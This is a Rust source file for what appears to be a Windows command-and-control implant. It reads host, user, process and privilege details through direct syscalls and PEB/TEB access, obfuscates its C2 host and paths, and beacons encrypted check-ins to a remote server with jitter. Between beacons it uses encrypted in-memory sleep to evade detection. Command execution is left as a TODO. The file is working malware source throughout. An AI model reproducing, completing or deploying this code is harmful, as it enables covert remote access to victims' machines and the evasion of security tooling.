use core::ffi::c_void;

use crate::core::net::json::{JsonReader, JsonWriter};
use crate::core::net::transport::HttpSession;
use crate::core::net::crypto;
use crate::debug;
use crate::core::{invoke, ssn_table};

// Build time C2 config (XORed and embedded by build.rs)
pub struct C2Config<'a> {
    pub host: &'a [u16],
    pub port: u16,
    pub use_https: bool,
    pub secret: &'a [u8],
    pub interval_ms: u64,
    pub jitter_pct: u8,
}

// Gather system info for beacon check in
struct SysInfo {
    hostname: String,
    username: String,
    os_version: String,
    pid: u32,
    process_name: String,
    arch: &'static str,
    integrity: &'static str,
}

/**
 * Generate a session ID by hashing PID + RDTSC 
 * */
unsafe fn generate_session_id() -> String {
    let pid = get_current_pid();
    let tsc: u64;
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32", 
        "or rax, rdx",
        out("rax") tsc,
        out("rdx") _
    );

    let mut hash = 0x811c9dc5u32;
    for &b in &pid.to_le_bytes() {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    for &b in &tsc.to_le_bytes() {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }

    let hex_chars = b"0123456789abcdef";
    let mut id = String::with_capacity(8);
    for i in (0..8).rev() {
        let nibble = ((hash >> (i * 4)) & 0xF) as usize;
        id.push(hex_chars[nibble] as char);
    }
    id
}

/**
 * Get current process ID from TEB
 * */
unsafe fn get_current_pid() -> u32 {
    let teb: u64;
    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);    
    let pid_ptr = (teb + 0x40) as *const u64; // TEB.ClientId.UniqueProcess at offset 0x40 on x64
    *pid_ptr as u32
}

/**
 * THIS IS NOT ACCURATE
 * */
unsafe fn get_rough_timestamp() -> i64 {
    let kuser_shared = 0x7FFE000usize as *const u8;
    // offset 0x14: SystemTime.LowPart, 0x18: SystemTime.High1Time
    let low = *(kuser_shared.add(0x14) as *const u32) as u64;
    let high = *(kuser_shared.add(0x18) as *const u32) as u64;
    let filetime = (high << 32) | low;
    // convert windwos FILETIME to Unix epoch
    ((filetime - 116444736000000000) / 10000000) as i64
}

/**
 * Resolve the current process image name from PEB at runtime
 * PEB -> ProcessParameters -> ImagePathName (UNICODE_STRING)
 * */
unsafe fn get_process_name_from_peb() -> String {
    let peb: usize;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    if peb == 0 { return String::from("unknown") }

    // PEB.ProcessParameters at offset 0x20 in x64
    let process_params = *((peb + 0x20) as *const usize);
    if process_params == 0 { return String::from("unknwon") }

    // RTL_USER_PROCESS_PARAMETERS.ImagePathName (UNICODE_STRING) at offset 0x60
    let img_len = *((process_params + 0x60) as *const u16) as usize;
    if img_len == 0 { return String::from("unknown") }
    let img_wchars = img_len / 2;

    let img_buf = *((process_params + 0x68) as *const usize) as *const u16;
    if img_buf.is_null() { return String::from("unknown") }

    let path = core::slice::from_raw_parts(img_buf, img_wchars);

    // Finc last backslash to extract filename only
    let mut last_sep = 0;
    for i in 0..path.len() {
        if path[i] == b'\\' as u16 || path[i] == b'/' as u16 {
            last_sep = i + 1;
        }
    }

    wide_to_string(&path[last_sep..])
}

/**
 * Query the current process integrity level
 * */
unsafe fn query_integrity_level() ->  &'static str {
    let table = ssn_table::syscall_table();
    if table.ssns.nt_open_process_token.ssn == 0 || table.ssns.nt_query_information_token.ssn == 0 {
        return "unknown";
    }

    // Open current process token
    let mut token_handle: *mut c_void = core::ptr::null_mut();
    let current_process = -1isize as *mut c_void;
    let status = invoke::syscall3(
        table.ssns.nt_open_process_token.ssn,
        table.ssns.nt_open_process_token.syscall_addr as usize,
        current_process as usize,
        0x008, // TOKEN_QUERY
        &mut token_handle as *mut _ as usize
    );

    if status != 0 || token_handle.is_null() {
        return "unkown";
    }

    // Query TokenIntegrityLevel 
    let mut buf = [0u8; 64];
    let status = invoke::syscall4(
        table.ssns.nt_query_information_token.ssn,
        table.ssns.nt_query_information_token.syscall_addr as usize,
        token_handle as usize,
        25, // TokenIntegrityLevel
        buf.as_mut_ptr() as usize,
        64,
    );

    // close token handle
    invoke::syscall1(
        table.ssns.nt_close.ssn, 
        table.ssns.nt_close.syscall_addr as usize,
        token_handle as usize
    );

    if status != 0 {
        return "unkown";
    }

    // TOEKEN_MANDATORY_LABLE: fist 8 byte are SID pointer then attributes
    // the SID last sub authority contains the integrity RID
    let sid_ptr = *(buf.as_ptr() as *const *const u8);
    if sid_ptr.is_null() {
        return "unkown";
    }

    // SID structure: revision(1) + sub_auth_count(1) + authority(6) + sub_authorities(4*N)
    let sub_auth_count = *sid_ptr.add(1) as usize;
    if sub_auth_count == 0 {
        return "unkwon"
    }
    // Last sub authority is at offset 8 + (sub_auth_count - 1) * 4
    let rid_offset = 8 + (sub_auth_count - 1) * 4;
    let rid = *(sid_ptr.add(rid_offset) as *const u32);

    match rid {
        0x0000..=0x0FFF => "untrusted",
        0x1000..=0x1FFF => "low",
        0x2000..=0x2FFF => "medium",
        0x3000..=0x3FFF => "high",
        0x4000.. => "system",
    }
}

/**
 * Build the beacon check in JSON payload
 * */
fn build_beacon_json(session_id: &str, info: &SysInfo) -> Vec<u8> {
    let mut w = JsonWriter::new();
    w.begin_object();
    w.key_str("session_id", session_id);
    w.key_str("hostname", &info.hostname);
    w.key_str("username", &info.username);
    w.key_str("os", &info.os_version);
    w.key_u32("pid", info.pid);
    w.key_str("process", &info.process_name);
    w.key_str("arch", info.arch);
    w.key_str("integrity", info.integrity);
    // TODO: Use NtQuerySystemTime 
    w.key_i64("timestamp", unsafe { get_rough_timestamp() });
    w.key_object("metadata");
    w.end_object(); // close metadata
    w.end_object(); // close root
    w.finish()
}

unsafe fn gather_sysinfo() -> SysInfo {
    let table = ssn_table::syscall_table();

    // Hostname using GetComputerNameExW (ComputerNameDnsHostname = 3)
    let hostname = if !table.win32.get_computer_name_ex_w.is_null() {
        type FnGetComputerNameExW = unsafe extern "system" fn (u32, *mut u16, *mut u32) -> i32;
        let func: FnGetComputerNameExW = core::mem::transmute(table.win32.get_computer_name_ex_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(3, buf.as_mut_ptr(), &mut size) != 0 {
            wide_to_string(&buf[..size as usize])
        } else {
            String::from("unknwon")
        } 
    } else {
        String::from("unknwon")
    };

    // Username using GetUserNameW
    let username = if !table.win32.get_user_name_w.is_null() {
        type FnGetUserNameW = unsafe extern "system" fn (*mut u16, *mut u32) -> i32;
        let func: FnGetUserNameW = core::mem::transmute(table.win32.get_user_name_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(buf.as_mut_ptr(), &mut size) != 0 && size > 1 {
            wide_to_string(&buf[..size as usize - 1])
        } else {
            String::from("unknwon")
        } 
    } else {
        String::from("unknwon")
    };

    // OS Version using RtlGetVersion
    let os_version = {
        let mut info = crate::core::types::OsVersionInfoExW {
            os_version_info_size: core::mem::size_of::<crate::core::types::OsVersionInfoExW>() as u32,
            major_version: 0,
            minor_version: 0,
            build_number: 0,
            platform_id: 0,
            csd_version: [0u16; 128],
            service_pack_major: 0,
            service_pack_minor: 0,
            suite_mask: 0,
            product_type: 0,
            reserved: 0,
        };
        if !table.win32.rtl_get_version.is_null() {
            crate::core::win32::rtl_get_version(&mut info);
        }
        let mut ver = String::from("Windows ");
        append_u32(&mut ver, info.major_version);
        ver.push('.');
        append_u32(&mut ver, info.minor_version);
        ver.push_str(" Build ");
        append_u32(&mut ver, info.build_number);    
        ver
    };

    // PID from TEB
    let pid = get_current_pid();

    let process_name = get_process_name_from_peb();
    let integrity = query_integrity_level();

    SysInfo { hostname, username, os_version, pid, process_name, arch: "x64", integrity }
}

unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) {
    let actual_ms = if jitter_pct > 0 {
        let tsc: u64;
        core::arch::asm!(
            "rdtsc", 
            "shl rdx, 32", 
            "or rax, rdx", 
            out("rax") tsc, 
            out("rdx") _
        );
        let jitter_range = base_ms * jitter_pct as u64 / 100;
        let offset = tsc % (jitter_range * 2 + 1);
        base_ms - jitter_range + offset 
    } else {
        base_ms
    };

    let delay: i64 = -((actual_ms as i64) * 10000);
    debug!("[BEACON] Sleeping {}ms", actual_ms);

    // use encrypted sleep - xor memory, flip rx -> rw, sleep, flip rw -> rx, decrypt
    crate::core::sleep::encrypted_sleep(delay);
}

pub unsafe fn beacon_loop(config: &C2Config) {
    if !ssn_table::initialize_network() {
        return;
    }

    let key = crypto::sha256(config.secret);

    let session_id = generate_session_id();
    debug!("[BEACON] SessionID: {}", session_id);

    let sysinfo = gather_sysinfo();
    // debug!("[BEACON] {}@{} PID:{} ({})", sysinfo.username, sysinfo.hostname, sysinfo.pid, sysinfo.integrity);

    let session = match HttpSession::new(config.host, config.port, config.use_https) {
        Some(s) => s,
        None =>  {
            debug!("[BEACON] Failed to establish HTTP session");
            return;
        },
    };

    // Beacon paths
    // /api/beacon
    let beacon_path: [u16; 12] = [
        0x002F, 0x0061, 0x0070, 0x0069, 0x002F, 0x0062, 0x0065,
        0x0061, 0x0063, 0x006F, 0x006E, 0x0000,
    ];
    // /api/result
    let result_path: [u16; 12] = [
        0x002F, 0x0061, 0x0070, 0x0069, 0x002F, 0x0072, 0x0065,
        0x0073, 0x0075, 0x006C, 0x0074, 0x0000,
    ];

    let mut interval = config.interval_ms;
    let mut jitter = config.jitter_pct;

    loop {
        // Build beacon data
        let beacon_json = build_beacon_json(&session_id, &sysinfo);
        debug!("[BEACON] Checkin ({} bytes plaintext)", beacon_json.len());
    
        // Encrypt 
        let encrypted = crypto::aes256_gcm_encrypt(&key, &beacon_json);

        // POST to /api/beacon
        match session.post(&beacon_path, &encrypted) {
            Some(response_data) => {
                debug!("[BEACON] Response recived ({} bytes)", response_data.len());

                // Decrypt response
                if let Some(plaintext) = crypto::aes256_gcm_decrypt(&key, &response_data) {
                    // Parse Command
                    let mut reader = JsonReader::new(&plaintext); 
                    if let Some(response) = reader.parse_beacon_response() {
                        // update interval/jitter if server sent new values
                        if let Some(new_interval) = response.interval {
                            interval = new_interval * 1000u64; // because server will send seconds
                            debug!("[BEACON] Interval update: {}ms", interval);
                        }
                        if let Some(new_jitter) = response.jitter {
                            jitter = new_jitter; // because server will send seconds
                            debug!("[BEACON] Jitter update: {}%", jitter);
                        }
                        // TODO: Execute commands and send result
                    }
                } else {
                    debug!("[BEACON] Decryption failed, key mismatch?");
                }
            }
            None => {
                debug!("[BEACON] POST failed, server unreachable");
                interval = core::cmp::min(interval * 2, 300000); // On failure, back off (double interval, max 5 min)
            }
        }

        // Sleep with jitter
        beacon_sleep(interval, jitter)
    }
}

fn wide_to_string(wide: &[u16]) -> String {
    let mut s = String::with_capacity(wide.len());
    for &c in wide {
        if c == 0 { break; }
        if c < 128 {
            s.push(c as u8 as char);
        } else {
            s.push('?');
        }
    }
    s
}

fn append_u32(s: &mut String, mut val: u32) {
    if val == 0 {
        s.push('0');
        return;
    }
    let mut digits = [0u8; 10];
    let mut i = 0;
    while val > 0 {
        digits[i] = b'0' + (val % 10) as u8;
        val /= 10;
        i += 1;
    }
    while i > 0 {
        i -= 1;
        s.push(digits[i] as char);
    }
}
